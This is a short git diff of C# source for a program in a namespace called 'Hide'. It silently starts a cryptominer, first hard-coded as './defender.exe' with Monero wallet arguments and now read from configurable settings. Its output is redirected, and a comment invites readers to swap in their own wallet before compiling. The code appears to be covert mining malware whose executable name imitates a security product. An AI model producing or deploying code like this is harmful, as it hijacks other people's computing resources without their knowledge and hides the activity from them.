@@ -6,9 +6,10 @@ namespace Hide
     {
         static void Main()
         {
+            var settings = Properties.Settings.Default;
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-            startInfo.FileName = "./defender.exe";
-            startInfo.Arguments = "-user dylan@thisiswhereidostuff.com -xmr 2"; //this is obviously my wallet, replace with your own
+            startInfo.FileName = settings.pathToProcess;
+            startInfo.Arguments = string.Format("-user {0} {1} {2}", settings.user, settings.currency, settings.cpuCoreCount ); //this is obviously my wallet, replace with your own
             startInfo.RedirectStandardOutput = true;                                   //before compiling
             startInfo.RedirectStandardError = true;
             startInfo.UseShellExecute = false;
